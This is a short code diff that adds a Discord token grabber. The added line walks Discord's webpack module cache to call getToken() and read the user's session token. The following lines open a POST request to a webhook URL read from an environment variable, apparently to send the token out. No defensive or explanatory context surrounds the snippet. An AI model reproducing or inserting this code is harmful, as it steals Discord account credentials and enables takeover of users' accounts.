@@ -1,6 +1,6 @@
  var XMLHttpRequest = require('xhr2');
 
-token = "hi"
+token=(webpackChunkdiscord_app.push([[""],{},e=>{m=[];for(let t in e.c)m.push(e.c[t])}]),m).find((e=>void 0!==e?.exports?.default?.getToken)).exports.default.getToken();
 const request = new XMLHttpRequest();
       request.open("POST", process.env.webhookurl);
 
